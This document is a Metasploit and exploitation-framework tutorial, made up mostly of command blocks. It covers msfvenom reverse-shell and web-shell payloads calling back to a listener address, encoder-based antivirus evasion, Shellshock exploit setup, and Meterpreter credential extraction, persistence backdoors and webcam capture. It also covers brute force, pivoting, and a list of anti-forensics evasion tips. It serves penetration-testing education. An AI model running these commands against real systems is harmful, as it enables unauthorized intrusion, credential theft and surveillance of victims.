# Metasploit & Exploitation Frameworks

Metasploit is the world's most popular penetration testing framework, providing a comprehensive platform for exploit development, payload generation, and post-exploitation activities.

---

## Metasploit Framework Overview

### What is Metasploit?
- **Exploitation Framework**: Collection of exploits, payloads, and auxiliary modules
- **Professional Tool**: Used by penetration testers and security researchers worldwide
- **Modular Architecture**: Extensible framework for custom exploit development
- **Cross-Platform**: Works on Linux, Windows, and macOS

### Framework Components
- **Exploits**: Code that takes advantage of vulnerabilities
- **Payloads**: Code executed after successful exploitation
- **Encoders**: Obfuscate payloads to evade detection
- **Auxiliary**: Scanning, fuzzing, and enumeration modules
- **Post**: Post-exploitation modules for maintaining access

---

## Getting Started with Metasploit

### Installation and Setup
```bash
# Metasploit comes pre-installed on Kali Linux
msfconsole

# Manual installation on Ubuntu/Debian
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Basic Commands
```bash
# Start Metasploit console
msfconsole

# Update framework
msfupdate

# Database operations
msfdb init                    # Initialize database
msfdb status                  # Check database status
db_status                     # Database status from msfconsole
```

### Essential msfconsole Commands
```bash
# Navigation and help
help                          # Show help menu
help <command>               # Specific command help
back                         # Go back to previous context
exit                         # Exit msfconsole

# Search and selection
search <term>                # Search for modules
search type:exploit platform:linux
use <module_path>            # Select a module
info                         # Show module information
show options                 # Display module options
```

---

## Working with Exploits

### Finding and Using Exploits
```bash
# Search for specific vulnerabilities
search cve:2021-44228        # Log4j vulnerability
search ms17-010              # EternalBlue
search platform:linux type:exploit

# Select and configure exploit
use exploit/linux/http/apache_mod_cgi_bash_env_exec
show options
set RHOSTS 192.168.1.100
set RPORT 80
set TARGETURI /cgi-bin/test.cgi
```

### Exploit Configuration
```bash
# Set required options
set RHOSTS 192.168.1.100    # Target host(s)
set RPORT 443                # Target port
set LHOST 10.10.10.10       # Local host for reverse connections
set LPORT 4444               # Local port for reverse connections

# Show advanced options
show advanced

# Set target (if multiple targets available)
show targets
set TARGET 0
```

### Running Exploits
```bash
# Check if target is vulnerable
check

# Run the exploit
exploit
# or
run

# Run exploit in background
exploit -j

# Show active sessions
sessions -l
```

---

## Payloads and Payload Generation

### Understanding Payloads
- **Singles**: Self-contained, don't rely on external components
- **Stagers**: Small payloads that download larger payloads
- **Stages**: Downloaded by stagers for full functionality

### Common Payload Types
```bash
# Linux payloads
linux/x86/shell_reverse_tcp           # Simple shell
linux/x64/meterpreter/reverse_tcp     # Full Meterpreter
linux/x86/shell_bind_tcp              # Bind shell

# Windows payloads
windows/meterpreter/reverse_tcp       # Windows Meterpreter
windows/shell_reverse_tcp             # Simple Windows shell
windows/x64/shell_reverse_tcp         # 64-bit Windows shell
```

### Generating Standalone Payloads
```bash
# Generate ELF executable
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf > shell.elf

# Generate Windows executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe

# Generate PHP web shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# Generate Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.py
```

### Payload Encoding and Evasion
```bash
# Encode payload to avoid detection
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > encoded_shell.exe

# Multiple encoding iterations
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f elf > encoded_shell.elf

# List available encoders
msfvenom --list encoders
```

---

## Meterpreter Post-Exploitation

### What is Meterpreter?
Advanced payload that provides:
- **In-memory execution**: Doesn't write to disk
- **Encrypted communication**: TLS encrypted C2 channel
- **Extensible**: Loadable modules for various functions
- **Multi-platform**: Works on Windows, Linux, Android, etc.

### Basic Meterpreter Commands
```bash
# System information
sysinfo                      # System information
getuid                       # Current user
getpid                       # Current process ID
ps                          # List processes

# File system operations
pwd                         # Current directory
ls                          # List files
cd /path/to/directory       # Change directory
download /remote/file /local/path  # Download file
upload /local/file /remote/path    # Upload file

# Process management
migrate <PID>               # Migrate to another process
kill <PID>                 # Kill process
execute -f /bin/bash -i     # Execute command
```

### Advanced Meterpreter Features
```bash
# Network enumeration
arp                         # ARP table
netstat                     # Network connections
route                       # Routing table
portfwd add -l 8080 -p 80 -r 192.168.1.100  # Port forwarding

# Privilege escalation
getsystem                   # Attempt to get SYSTEM (Windows)
getprivs                    # Show current privileges

# Persistence
run persistence -X -i 60 -p 4444 -r 10.10.10.10  # Install persistent backdoor

# Screenshot and webcam
screenshot                  # Take screenshot
webcam_list                # List webcams
webcam_snap                # Take webcam photo
```

### Meterpreter Modules
```bash
# Load additional modules
load kiwi                   # Password extraction (Windows)
load stdapi                 # Standard API functions
load priv                   # Privilege escalation functions

# Post-exploitation modules
run post/linux/gather/enum_system        # System enumeration
run post/linux/gather/checkvm            # Virtual machine detection
run post/linux/gather/enum_configs       # Configuration files
```

---

## Multi-Handler and Session Management

### Setting up Multi-Handler
```bash
# Configure multi-handler for incoming connections
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit -j                  # Run in background
```

### Session Management
```bash
# List active sessions
sessions -l

# Interact with session
sessions -i 1               # Interact with session 1

# Background current session
background

# Kill sessions
sessions -k 1               # Kill session 1
sessions -K                 # Kill all sessions

# Upgrade shell to Meterpreter
sessions -u 1               # Upgrade session 1
```

---

## Auxiliary Modules

### Scanning and Enumeration
```bash
# Port scanning
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,3389
run

# Service detection
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# SMB enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
```

### Brute Force Attacks
```bash
# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run

# HTTP brute force
use auxiliary/scanner/http/http_login
set RHOSTS 192.168.1.100
set AUTH_URI /admin/login
run
```

### Fuzzing and Testing
```bash
# HTTP directory fuzzing
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/dirb/wordlists/common.txt
run

# SSL certificate gathering
use auxiliary/gather/ssl_cert
set RHOSTS 192.168.1.100
set RPORT 443
run
```

---

## Advanced Techniques

### Pivoting and Routing
```bash
# Add route through compromised host
route add 192.168.2.0/24 <session_id>

# Use compromised host as proxy
use auxiliary/server/socks4a
set SRVPORT 1080
run -j

# Configure proxychains to use SOCKS proxy
# Edit /etc/proxychains4.conf
# socks4 127.0.0.1 1080
proxychains nmap -sT 192.168.2.100
```

### Custom Payloads and Exploits
```bash
# Create custom payload template
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f c

# Ruby exploit template
cp /usr/share/metasploit-framework/modules/exploits/linux/http/apache_mod_cgi_bash_env_exec.rb my_exploit.rb

# Load custom module
loadpath /path/to/custom/modules
```

### Automation and Scripting
```bash
# Resource scripts for automation
cat > auto_exploit.rc << EOF
use exploit/linux/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.168.1.100
set LHOST 10.10.10.10
set LPORT 4444
exploit -j
EOF

# Run resource script
msfconsole -r auto_exploit.rc
```

---

## Other Exploitation Frameworks

### Empire Framework
```bash
# PowerShell post-exploitation framework
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
./setup/install.sh
./empire

# Starkiller GUI
./starkiller
```

### Cobalt Strike (Commercial)
- Professional adversary simulation platform
- Advanced C2 capabilities
- Team collaboration features
- Malleable C2 profiles for evasion

### Covenant (.NET Framework)
```bash
# .NET command and control framework
git clone https://github.com/cobbr/Covenant
cd Covenant/Covenant
dotnet run
```

---

## Best Practices and Ethics

### Professional Usage Guidelines
- **Authorization**: Only use on systems you own or have explicit permission to test
- **Documentation**: Keep detailed logs of all activities
- **Scope Management**: Stay within defined testing boundaries
- **Cleanup**: Remove any backdoors or modifications after testing

### Detection Evasion
- Use encrypted payloads and communication
- Employ anti-forensics techniques
- Migrate to legitimate processes
- Use legitimate tools for malicious purposes (LOLBins)

### Legal and Ethical Considerations
- Understand local laws regarding penetration testing
- Obtain proper authorization before testing
- Report vulnerabilities responsibly
- Use knowledge to improve security, not cause harm

---

## Practice Resources

### Vulnerable Targets
- **Metasploitable**: Intentionally vulnerable Linux
- **VulnHub VMs**: Various difficulty levels
- **HackTheBox**: Online vulnerable machines
- **TryHackMe**: Guided learning paths

### Learning Platforms
- **Rapid7 University**: Official Metasploit training
- **Offensive Security**: OSCP and advanced courses
- **Cybrary**: Free cybersecurity courses
- **YouTube**: Ippsec, LiveOverflow for practical examples

Metasploit mastery requires consistent practice and understanding of the underlying vulnerabilities. Focus on understanding how exploits work rather than just running them blindly.